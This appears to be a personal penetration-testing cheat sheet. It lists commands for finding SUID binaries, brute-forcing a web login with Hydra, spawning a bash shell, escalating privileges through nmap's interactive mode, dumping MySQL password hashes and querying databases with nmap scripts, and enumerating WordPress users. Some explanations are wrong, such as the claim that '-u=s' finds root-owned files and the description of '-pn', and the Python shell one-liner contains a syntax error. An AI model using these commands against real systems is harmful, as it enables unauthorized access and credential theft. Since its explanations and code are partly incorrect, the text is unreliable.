Find all files with SUID bit

    find / -perm -u=s -type f 2>/dev/null

or

    find / -perm -4000 -type f 2>/dev/null

Explanation:

    /denotes  start from the top (root) of the file system and find every directory
    -permdenotes search for the permissions that follow
    -u=sdenotes look for files that are owned by the root user
    -typestates the type of file we are looking for
    f denotes a regular file not the directories or special files
    2 denotes to the second file descriptor of the process, i.e. stderr (standard error)
    > means redirection
    /dev/null is a special filesystem object that throws away everything written into it.


Hydra Password Bruteforce

    hydra 192.168.1.69 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
    
Explanation:

    Host = 192.168.1.69
    Method = http-form-post
    URL = /w3af/bruteforce/form_login/dataReceptor.php
    Form parameters = user=^USER^&pass=^PASS^
    Failure response = Bad login
    Users file = users.txt
    Password file = pass.txt
    Threads = -t 10
    Wait for timeout = -w 30
    Output file = -o hydra-http-post-attack.txt

To remove all duplicates in a dictionary file

    cat filename.txt | sort | uniq > outfile.txt

Spawn bash

    python -c 'import.pty;pty.spawn("/bin/bash")'

nmap interactive

	nmap --interactive
	!bash -p
more nmap
	-sL : list targets to scan
	-pn : disable port scan(ping sweep?)
	
cool nmap scripts
	
	--script=http-enum
	--script=http-default-accounts
	--script=http-phpmyadmin-dir-traversal
	

passing parameters into nmap script example

	nmap -p 3306 <ip> --script mysql-dump-hashes --script-args='username=root,password=secret'
	nmap -p 3306 100.65.136.252 --script=mysql-query --script-args='query="show tables FROM corporate_database",username=root,password=abc123'
	
	**dont forget username and pass

List of nmap scripts	
https://nmap.org/nsedoc/



WPSCAN

	wpscan --url <url>
	
WPSCAN enumerate users
	-enumerate u
	
	-e ap
